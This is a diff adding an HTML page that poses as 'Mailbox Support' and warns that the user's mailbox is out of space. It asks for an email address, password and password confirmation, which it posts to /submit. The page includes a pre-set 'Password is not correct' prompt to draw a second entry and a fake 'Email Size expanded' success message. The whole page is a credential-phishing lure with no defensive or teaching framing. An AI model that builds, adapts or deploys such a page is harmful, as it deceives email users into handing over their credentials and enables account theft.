@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mailbox Support</title>
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+
+<body>
+    <script defer src="/js/main.js"></script>
+    <header>
+        <h1>Increase Mail Box limit</h1>
+    </header>
+    <main>
+        <p><span class="red">Your mailbox is running out of space </span><br>
+            <br>
+            To expand Mail storage limit follow the steps below
+        </p>
+        <form id="form" action="/submit" method="post">
+            <label>
+                <p id="foundPop" class="green">Email found</p>
+                <input id="email" type="email" name="email" required>
+                <p>Email Address</p>
+            </label>
+            <label>
+                <p>Password is not correct</p>
+                <input id="password" type="password" name="password" required>
+                <p>Password</p>
+            </label>
+            <label>
+                <p id="notMatchPop" class="red">Passwords do not match</p>
+                <input id="confirm-password" type="password" name="confirm-password" required>
+                <p>Confirm Password</p>
+            </label>
+            <input id="submit" type="submit" value="Submit">
+        </form>
+    </main>
+    <section>
+        <svg width="32px" height="32px" viewBox="0 0 57 57" xmlns="http://www.w3.org/2000/svg" fill="currentColor"
+            color="#000000">
+            <g transform="translate(1 1)" fill-rule="evenodd">
+                <circle cx="5" cy="50" r="5">
+                    <animate attributeName="cy" begin="0s" dur="2.2s" values="50;5;50;50" calcMode="linear"
+                        repeatCount="indefinite"></animate>
+                    <animate attributeName="cx" begin="0s" dur="2.2s" values="5;27;49;5" calcMode="linear"
+                        repeatCount="indefinite"></animate>
+                </circle>
+                <circle cx="27" cy="5" r="5">
+                    <animate attributeName="cy" begin="0s" dur="2.2s" from="5" to="5" values="5;50;50;5"
+                        calcMode="linear" repeatCount="indefinite"></animate>
+                    <animate attributeName="cx" begin="0s" dur="2.2s" from="27" to="27" values="27;49;5;27"
+                        calcMode="linear" repeatCount="indefinite"></animate>
+                </circle>
+                <circle cx="49" cy="50" r="5">
+                    <animate attributeName="cy" begin="0s" dur="2.2s" values="50;50;5;50" calcMode="linear"
+                        repeatCount="indefinite"></animate>
+                    <animate attributeName="cx" from="49" to="49" begin="0s" dur="2.2s" values="49;5;27;49"
+                        calcMode="linear" repeatCount="indefinite"></animate>
+                </circle>
+            </g>
+        </svg>
+    </section>
+
+    <div class="result">
+        <h2>Email Size expanded</h2>
+    </div>
+    <footer>
+        © Mail Box Support 2000 - 2021
+    </footer>
+</body>
+
+</html>
